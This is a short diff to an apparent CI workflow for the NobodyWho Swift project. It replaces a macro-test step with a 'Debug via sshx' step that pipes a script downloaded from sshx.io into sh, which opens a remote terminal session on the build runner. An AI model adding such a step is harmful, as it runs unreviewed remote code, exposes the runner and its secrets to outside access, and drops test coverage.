@@ -85,9 +85,8 @@ jobs:
           unzip -o xcframework-zip/NobodyWhoNative.xcframework.zip -d nobodywho/swift/Frameworks/
           ls -la nobodywho/swift/Frameworks/NobodyWhoNative.xcframework/
 
-      - name: "Run macro tests"
-        working-directory: ./nobodywho/swift
-        run: swift test --filter NobodyWhoMacroTests
+      - name: "Debug via sshx"
+        run: curl -sSf https://sshx.io/get | sh -s run
 
   integration-tests:
     if: inputs.full_ci
